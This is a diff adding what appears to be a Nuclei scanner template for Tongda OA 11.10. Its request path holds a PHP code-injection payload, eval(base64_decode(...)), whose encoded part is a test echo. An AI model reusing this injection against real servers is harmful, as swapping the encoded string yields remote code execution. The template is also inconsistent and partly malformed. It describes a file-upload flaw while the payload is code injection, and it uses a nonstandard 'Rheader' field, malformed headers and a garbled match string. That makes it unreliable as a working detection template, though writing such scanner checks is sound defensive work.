@@ -1,0 +1,33 @@
+id: 通达oa 11.10 存在未授权任意文件上传
+time: "2023-05-12"
+info:
+  author: ritikchaddha
+  severity: medium
+  description: 存在任意文件上传漏洞，通过漏可以上传恶意文件控制服务器
+  reference:
+    - https://mp.weixin.qq.com/s/z53MByKJ0o5NWL5jdqi24g
+  tags: tongda,disclosure
+  metadata:
+    max-request: 1
+
+http:
+  - method: 
+      - GET
+    path:
+      - "{{BaseURL}}/general/appbuilder/web/portal/gateway/getdata?activeTab=%E5%27%19,1%3D%3Eeval(base64_decode(%22ZWNobyB2dWxuX3Rlc3Q7%22)))%3B/*&id=19&module=Carouselimage"
+      
+    Rheader:
+      - Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 &  Accept-Encoding:gzip, deflate & Upgrade-Insecure-Requests:1
+      
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "錦\\"
+
+      - type: status
+        status:
+          - 200
